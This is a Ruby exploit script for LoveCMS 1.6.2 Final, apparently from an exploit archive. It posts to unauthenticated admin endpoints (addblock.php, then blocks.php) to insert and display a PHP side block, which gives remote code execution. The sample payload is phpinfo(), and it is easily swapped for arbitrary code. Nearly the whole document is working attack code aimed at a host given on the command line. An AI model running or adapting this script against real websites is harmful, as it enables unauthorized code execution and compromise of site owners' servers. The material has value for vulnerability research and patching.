LoveCMS 1.6.2 Final Remote Code Execution Exploit
=================================================


#!/usr/bin/ruby
#
## Exploit by PoMdaPiMp!
## ---------------------
##
##   LoveCMS Exploit Series
##   Episode 1: adding a side block
##
##   Description: add some php into a block container
##                on the side of the site. phpinfo() is called.
##
##   Usage: ./LoveCMS_1_blocks.rb <host>
##   Ex:    ./LoveCMS_1_blocks.rb http://site.com/lovecms/
##
##   Tested on: lovecms_1.6.2_final (MacOS X, Xampp)
#

require &#039;net/http&#039;
require &#039;uri&#039;

@host = &#039;http://127.0.0.1/lovecms_1.6.2_final/lovecms/&#039;

@host = ARGV[0] if ARGV[0]
@host += @host[-1, 1].to_s != &#039;/&#039; ? &#039;/&#039; : &#039;&#039;

if @host
  # --
  puts " + LoveCMS Exploit Series. #1: Adding side blocks."
  puts
  puts " : Attacking host: " + @host

  # --
  # Insert a new block
  res = Net::HTTP.post_form(URI.parse(@host + &#039;system/admin/addblock.php&#039;),
                            {&#039;submit&#039;=>&#039;1&#039;, &#039;title&#039;=>&#039;H4Ck&#039;, &#039;content&#039; => &#039;phpinfo();&#039;, &#039;type&#039; => &#039;php&#039;})
  puts " :: Block inserted."

  # --
  # Build post variable for next step
  post_vars = {&#039;submit&#039; => 1}
  (1..50).each do |id|
    post_vars[&#039;position&#039; + id.to_s] = 1
    post_vars[&#039;height&#039; + id.to_s] = 1
    post_vars[&#039;visible&#039; + id.to_s] = 1
  end
  # Make the block visible
  res = Net::HTTP.post_form(URI.parse(@host + &#039;system/admin/blocks.php&#039;), post_vars )
  puts " :: Blocks displayed."

  # --
  puts
  puts " - Visit " + @host
end



